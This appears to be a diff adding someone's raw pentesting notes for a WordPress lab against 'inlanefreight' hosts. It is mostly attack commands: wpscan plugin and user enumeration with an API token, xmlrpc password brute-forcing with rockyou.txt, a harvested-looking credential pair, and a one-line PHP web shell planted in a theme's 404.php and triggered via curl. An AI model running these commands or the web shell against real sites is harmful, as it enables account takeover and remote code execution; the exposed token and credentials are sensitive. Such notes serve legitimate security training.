@@ -1,0 +1,51 @@
+gem install wpscan
+wpscan --hh 
+erika 010203
+
+curl http://blog.inlanefreight.local'/wp-admin/admin.php?page=download_report&report=users&status=all'
+
+
+wpscan --url http://blog.inlanefreight.local --enumerate ap --api-token u3CSnnzVDaODCXytUsRR7XONa94Saf2ctZlB5vE0aYk
+10.129.72.79
+wpscan --url http://10.129.72.79 --enumerate ap --api-token u3CSnnzVDaODCXytUsRR7XONa94Saf2ctZlB5vE0aYk
+
+curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
+curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
+curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta
+
+
+wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://159.65.18.5:31215
+
+wpscan --password-attack xmlrpc -t 20 -U roger -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --url http://159.65.18.5:31215
+
+
+tree -L 1 	Lists contents of current directory
+curl -s -X GET <url> 	Makes a GET request to a webserver and receives HTML source code of requested web page
+curl -I -X GET <url> 	Prints the response header of the GET request from the requested web page
+curl -X POST -d <data> <url> 	Sends a POST request with data to specific webserver
+wpscan --url <url> -e ap 	Scans specific WordPress application to enumerate plugins
+wpscan --url <url> -e u 	Scans specific WordPress application to enumerate users
+msfconsole 	Starts Metasploit Framework
+html2text 	Converts redirected HTML output or files to easily readable output
+grep <pattern> 	Filters specific pattern in files or redirected output
+jq 	Transforms JSON input and streams of JSON entities
+man <tool> 	Man provides you with the manpage of the specific tool
+
+https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/
+
+<?php
+
+system($_GET['cmd']);
+curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
+
+https://reqbin.com/req/nfilsyk5/get-request-example
+POST /xmlrpc.php HTTP/1.1
+Host: 159.65.18.5
+Accept: */*
+Content-Length: 132
+
+<?xml version="1.0" encoding="utf-8"?> 
+<methodCall> 
+<methodName>system.listMethods</methodName> 
+<params></params> 
+</methodCall>
